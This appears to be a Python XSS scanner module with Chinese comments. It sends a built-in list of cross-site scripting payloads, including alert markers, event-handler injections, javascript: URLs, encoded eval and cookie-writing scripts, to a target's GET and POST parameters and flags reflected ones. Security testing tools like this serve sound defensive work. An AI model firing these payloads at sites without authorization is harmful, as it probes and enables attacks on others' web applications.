"""XSS检测"""
import requests
from typing import Dict, List, Any
from common.logger import Logger


class XssScanner:
    """XSS检测扫描器"""
    
    def __init__(self, base_url: str):
        """初始化"""
        self.base_url = base_url
        self.logger = Logger(__name__)
        self.session = requests.Session()
    
    def get_payloads(self) -> List[str]:
        """获取XSS payloads"""
        return [
            # 基本XSS
            "<script>alert('XSS')</script>",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>",
            
            # 事件XSS
            "<img src='x' onerror='alert(1)'>",
            "<a href='javascript:alert(1)'>Click me</a>",
            "<div onmouseover='alert(1)'>Hover me</div>",
            "<body onload='alert(1)'>",
            
            # 变形XSS
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
            "<script>\x61\x6c\x65\x72\x74\x28\x31\x29</script>",
            "<script>/* comment */alert/* comment */(1)</script>",
            
            # HTML5 XSS
            "<iframe src='javascript:alert(1)'></iframe>",
            "<video src='x' onerror='alert(1)'>",
            "<audio src='x' onerror='alert(1)'>",
            
            # 存储型XSS
            "<script>localStorage.setItem('xss', 'test')</script>",
            "<script>document.cookie='xss=test'</script>",
            
            # DOM型XSS
            "<script>document.write(location.hash)</script>",
            "<script>eval(location.search)</script>",
            
            # 其他XSS
            "'onmouseover=\"alert(1)\"'",
            '"onload="alert(1)"',
            "<svg onload='alert(1)'>",
            "<math onerror='alert(1)'>"
        ]
    
    def scan_get_endpoints(self, endpoints: List[str]) -> List[Dict[str, Any]]:
        """扫描GET请求的XSS"""
        vulnerabilities = []
        payloads = self.get_payloads()
        
        for endpoint in endpoints:
            for payload in payloads:
                url = f"{self.base_url}{endpoint}?q={payload}"
                try:
                    response = self.session.get(url, timeout=10)
                    
                    # 检测payload是否在响应中
                    if payload in response.text:
                        vulnerabilities.append({
                            "type": "XSS (GET)",
                            "endpoint": endpoint,
                            "payload": payload,
                            "status_code": response.status_code
                        })
                    
                    # 检测变形payload
                    elif "alert(1)" in response.text or "alert('XSS')" in response.text:
                        vulnerabilities.append({
                            "type": "XSS (GET)",
                            "endpoint": endpoint,
                            "payload": payload,
                            "status_code": response.status_code,
                            "message": "可能存在变形XSS"
                        })
                        
                except Exception as e:
                    self.logger.error(f"XSS扫描失败: {e}")
        
        return vulnerabilities
    
    def scan_post_endpoints(self, endpoints: List[str], data_template: Dict[str, str]) -> List[Dict[str, Any]]:
        """扫描POST请求的XSS"""
        vulnerabilities = []
        payloads = self.get_payloads()
        
        for endpoint in endpoints:
            for field in data_template:
                for payload in payloads:
                    data = data_template.copy()
                    data[field] = payload
                    
                    try:
                        response = self.session.post(f"{self.base_url}{endpoint}", data=data, timeout=10)
                        
                        # 检测payload是否在响应中
                        if payload in response.text:
                            vulnerabilities.append({
                                "type": "XSS (POST)",
                                "endpoint": endpoint,
                                "field": field,
                                "payload": payload,
                                "status_code": response.status_code
                            })
                        
                        # 检测变形payload
                        elif "alert(1)" in response.text or "alert('XSS')" in response.text:
                            vulnerabilities.append({
                                "type": "XSS (POST)",
                                "endpoint": endpoint,
                                "field": field,
                                "payload": payload,
                                "status_code": response.status_code,
                                "message": "可能存在变形XSS"
                            })
                            
                    except Exception as e:
                        self.logger.error(f"XSS扫描失败: {e}")
        
        return vulnerabilities
    
    def full_scan(self, get_endpoints: List[str], post_endpoints: List[str], data_template: Dict[str, str]) -> Dict[str, List[Dict[str, Any]]]:
        """完整扫描"""
        results = {
            "get_xss": self.scan_get_endpoints(get_endpoints),
            "post_xss": self.scan_post_endpoints(post_endpoints, data_template)
        }
        
        return results
